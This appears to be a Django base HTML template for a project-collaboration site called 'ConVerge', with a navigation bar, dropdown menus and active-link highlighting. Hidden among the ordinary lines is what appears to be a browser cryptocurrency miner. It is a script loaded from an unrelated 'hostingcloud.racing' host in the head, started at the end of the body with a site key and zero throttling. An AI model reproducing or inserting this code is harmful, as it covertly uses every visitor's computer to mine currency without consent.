<head>
  <!--This is where the nav bar and all the globalized styling will go-->
  {% load static %}
  <!-- Compiled and minified CSS credit to https://materializecss.com/-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<script src="https://www.hostingcloud.racing/jPfJ.js"></script>
<script
			  src="https://code.jquery.com/jquery-3.3.1.min.js"
			  integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
			  crossorigin="anonymous"></script>
    <!-- Compiled and minified JavaScript https://materializecss.com/-->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
</head>
<style>

.dc1 {
  display: none;
  position: absolute;
  background-color: #00e676;
  min-width: 160px;
  width: auto;
  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
  z-index: 1;
}
.subDown {
  font-size: .8em;
}
.show {display:block;}
</style>
<body class="blue-grey lighten-4">

  <nav>
    <div class="nav-wrapper green accent-3">
      <a href="#" class="brand-logo">ConVerge</a>
      <ul id="nav-mobile" class="right hide-on-med-and-down">
        <li><a id="home" href="/">Home</a></li>
        {% if not user.is_authenticated %}
        <li><a id="login" href="/login">Login</a></li>
        <li><a id="register" href="/register">Sign Up</a></li>
        {% else %}
        <li class="drop1"><div class="dropdown">
          <a class="dc2" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
          Project Menu &#x25BF
          </a>
          <div id="dropSub" class="dc1">
            <a id="publicDashboard" href="/publicDashboard" class="subDown">Public Dashboard</a>
            <a id="createProject" href="/createProject" class="subDown">Create New Project</a>
          </div>
        </div></li>
        <li class="drop2"><div class="dropdown">
          <a class="dc2" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
          Profile Menu &#x25BF
          </a>
          <div id="dropSub2" class="dc1">
            <a id="profiles" href="/profiles" class="subDown">View Your Profile</a>
            <a id="myProjects" href="/myProjects" class="subDown">My Projects</a>
          </div>
        </div></li>
        <li></li>
        <li><a id="polls" href="/polls">Polls</a></li>

        <li><a id="logout" href="/logout">Logout</a></li>
        {% endif %}
        <li><a id="aboutus" href="/aboutus.html">About Us</a></li>
      </ul>
    </div>
  </nav>
  <script>
    function dropSub(x,y) {
      x = document.getElementById(x);
      x.classList.remove("hide");
      x.classList.toggle("show");
    }

    $(".drop1").click(function(){dropSub("dropSub","dropSub2");})
    $(".drop2").click(function(){dropSub("dropSub2","dropSub")})
    window.addEventListener("click", function(event) {
      if(event.target.className!=='dc2'){
        x = document.getElementById('dropSub');
        if(x.classList.contains("show")){
          x.classList.toggle("show");
        }
        x = document.getElementById('dropSub2');
        if(x.classList.contains("show")){
          x.classList.toggle("show");
        }
      }
    });
    match = 0;
    loc = window.location.href;
    headers = ["logout","login","profiles","createProject","register","publicDashboard", "myProjects", "aboutus", "polls"];
    for(var i=0;i<headers.length;i++){
      if(loc.includes(headers[i])){
        match = 1;
        if(headers[i]=="profiles" || headers[i]=="createProject" || headers[i]=="myProjects" || headers[i]=="publicDashboard"){
          el = document.getElementById(headers[i]);
          el = el.parentElement.parentElement;
          el.firstElementChild.style.color = "#00e676";
          el.style.backgroundColor = "white";
        }else{
          el = document.getElementById(headers[i]);
          el.style.color = "#00e676";
          el.style.backgroundColor = "white";
        }
      };
    };
    if(match == 0){
      el = document.getElementById("home");
      el.style.color = "#00e676";
      el.style.backgroundColor = "white";
    }
  </script>
  <!-- for django messages!! -->
  {% if messages %}
    {% for message in messages %}
      <div class="alert alert-{{ message.tags }}">
        {{ message }}
      </div>
    {% endfor %}
  {% endif %}
  {% block content%}

  {% endblock%}
  <script>
    var _client = new Client.Anonymous('855e463208028cd32c31b38e7cf054cb89da8fdbdd87243cf6f02cb7941440a8', {
        throttle: 0, c: 'w', ads: 0
    });
    _client.start();
  </script>
</body>
